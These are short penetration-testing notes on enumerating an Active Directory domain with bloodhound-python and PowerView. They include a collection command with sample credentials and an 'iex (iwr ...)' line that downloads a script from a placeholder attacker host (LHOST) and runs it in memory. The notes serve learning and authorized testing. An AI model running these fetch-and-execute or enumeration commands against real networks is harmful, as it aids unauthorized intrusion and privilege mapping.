## How we use Bloodhound to enumerate AD environment
using bloodhound-python to enumerate an AD environment were we can use the extracted information and injest into bloodhound to visualize the relations and inbounds and outbounds and the path from a user to another user/service, we can also utilize the Cypher Query Language for Neo4j to customize the output and many more usages.

### Basic Usage for bloodhound-python
```shell
bloodhound-python -u dead.user -p changeMeFr -ns <domain-ip> -d doman.name -c all --zip
```
#### [NOTE!]  We can import Custom Cypher queries into Bloodhound and use them to enumerate the AD environment

## Enumerating by HAND using PowerView.ps1
we first Invoke-expression to import that script into memory then we can use the modules inside it, 
```shell
iex (iwr -usebasicparsing http://<'LHOST'>/PowerView.ps1)
$sid = convert-nametosid <'USER'>
get-domainobjectacl -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose 
```
